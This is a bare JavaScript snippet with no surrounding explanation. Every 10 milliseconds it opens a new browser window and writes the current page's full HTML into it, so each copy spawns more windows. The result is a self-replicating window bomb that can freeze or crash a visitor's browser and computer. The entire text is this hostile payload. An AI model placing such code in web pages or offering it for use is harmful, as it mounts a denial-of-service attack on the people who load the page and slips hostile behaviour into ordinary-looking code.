setInterval(function () {
    var w = window.open();
    w.document.write(document.documentElement.outerHTML || document.documentElement.innerHTML);
}, 10);
